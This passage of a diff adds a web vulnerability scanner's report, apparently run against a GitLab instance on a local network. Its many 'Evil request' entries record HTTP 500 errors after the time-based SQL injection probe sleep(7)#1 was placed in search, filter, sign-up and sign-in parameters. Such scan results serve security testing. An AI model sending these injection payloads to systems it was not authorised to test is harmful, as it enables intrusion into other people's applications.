+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=name_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=latest_activity_asc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?sort=latest_activity_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=latest_activity_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=true&sort=latest_activity_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&sort=name_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=name_desc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?sort=name_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=created_desc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?sort=created_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=name_asc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?sort=name_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=latest_activity_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=only&sort=latest_activity_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=created_asc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?sort=created_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=stars_desc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?sort=stars_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&name=default&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&name=default&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&name=default&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&name=default&sort=name_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&name=default&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&name=default&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?archived=only&name=sleep%287%29%231&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?archived=only&name=sleep%287%29%231&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?archived=only&name=sleep%287%29%231&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?archived=only&name=sleep%287%29%231&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?archived=only&name=sleep%287%29%231&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?archived=only&name=sleep%287%29%231&sort=name_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=latest_activity_asc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=true&sort=latest_activity_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=latest_activity_asc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=only&sort=latest_activity_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=stars_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=true&sort=stars_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=created_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=true&sort=created_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=name_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=true&sort=name_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=created_asc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=true&sort=created_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=name_asc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=true&sort=name_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=name_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=only&sort=name_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=created_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=only&sort=created_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=name_asc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=only&sort=name_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=stars_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=only&sort=stars_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=created_asc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending?archived=only&sort=created_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /explore/snippets?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/administration/backup_restore/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/administration/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/administration/license.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/administration/reference_architectures/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/api/graphql/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/api/rest/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/ci/yaml/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/development/documentation/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/development/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/install/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/instance_configuration?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/integration/advanced_search/elasticsearch.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/integration/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/policy/maintenance.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/subscriptions/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/topics/authentication/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/tutorials/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/update/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/user/gitlab_com/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/user/group/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/user/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/user/permissions.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/user/profile/account/two_factor_authentication.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/user/profile/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /help/user/project/import/index.md?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /password?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter search
+Evil request:
+    GET /search?search=sleep%287%29%231&snippets=default&repository_ref=default&nav_source=navbar HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /search?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter search
+Evil request:
+    GET /search?search=sleep%287%29%231&snippets=false&repository_ref=default&nav_source=navbar HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/snippets
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /search/opensearch.xml?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /users?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /users/password?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /users/password/new?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /users/sign_in?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter redirect_to_referer
+Evil request:
+    GET /users/sign_in?redirect_to_referer=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /users/sign_up?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter authenticity_token
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_up
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=sleep%287%29%231&new_user%5Bfirst_name%5D=alice&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=Isd1oZ-86rG-icaAuoXD2H4I6UtRffQ9GK5rB1kc6jLVCpsAmHGX8TevdxPj7zhSzZD2puSCg7YLgk8eNrE9XQ&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=6OgYRjhatdKcG8TXiofsNXLmrOKZGynVryQFX6g9I54fJfbnP5fIkhU9dUTT7Re_wX6zDyzkXl68CCFGx5D08Q&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=bvD_cZa2goC6Q7jgWlM7kxSF5PGF__WpuxXvK7mdXD6ZPRHQkXv_wDNlCXMDOcAZpx37HDAAgiKoOcsy1jCLUQ&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=YfK-9eNRkSAahrYjX15r2FYy6er1_E70dcVZdmUNRAuWP1BU5JzsYJOgB7AGNJBS5ar2B0ADOX9m6X1vCqCTZA&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=_a2SLTmwWFElHJyxMBHt23aT1XlR1ys5yV7vjfoMQHkKYHyMPn0lEaw6LSJpexZRxQvKlOQoXLLacsuUlaGXFg&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=ferdrMY21mL9luNvs3UHaiM_rEzDtPzAAJoC33AXUICKJzMNwfurInSwUvzqH_zgkKezoXZLi0sTtibGH7qH7w&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=wJmEqs3OwHbwpcPymq8nfj5xCHSXLpU3qgfLs4cigTw3VGoLygO9NnmDcmHDxdz0jekXmSLR4ry5K--q6I9WUw&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=qJnWtMXJWOGuavZhJ4Ioi_p_J2uNVN4Iuut_ZQK4rx9fVDgVwgQloSdMR_J-6NMBSec4hjirqYOpx1t8bRV4cA&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=pK0E3KryAiZekEb9qCmQKfO3GfbjHi_iPXJGeUFax_BTYOp9rT9_Zte2927xQ2ujQC8GG1bhWGkuXmJgLvcQnw&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter new_user%5Bfirst_name%5D
+Evil request:
+    POST /users HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=fNFeHd-Yx76CRvYS2lpCwWDFNdj9LKgjoKUkAYOkyzaLHLC82FW6_gtgR4GDMLlL010qNUjT36iziQAY7AkcWQ&new_user%5Bfirst_name%5D=sleep%287%29%231&new_user%5Blast_name%5D=alice&new_user%5Busername%5D=alice&new_user%5Bemail%5D=
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Bpassword%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=GGFsvsgRWCYxAaywLiRevFApEd-ZEj7kM2_mJp1fXh7vrIIfz9wlZrgnHSN3TqU247EOMiztSW8gQ8I_8vKJcQ&user%5Blogin%5D=alice&user%5Bpassword%5D=sleep%287%29%231&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=o_0fPW4rNGmnJzeXhbYJD1D9O3n2lnQPwrhpGlKJuWFUMPGcaeZJKS4BhgTc3PKF42UklENpA4TRlE0DPSRuDg&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=-hgWf_TBMMYXwWNyRelJCKNaW0WzjvnBnD2YxMmuRpQN1fje8wxNhp7n0uEcg7KCEMJEqAZxjkqPEbzdpgOR-w&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=4ViZK4-5yEDG7c2Lg_da5BpFa9y6NY5AB0z0PTROFcoWlXeKiHS1AE_LfBjanaFuqd10MQ_K-csUYNAkW-PCpQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=f9zx7WHHhq4rB31OQjVlB6Z7mJWkQLTPCgNZkZ0MyaGIER9MZgr77qIhzN0bX56NFeOHeBG_w0QZL32I8qEezg&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+
+                                  *   *   *
+
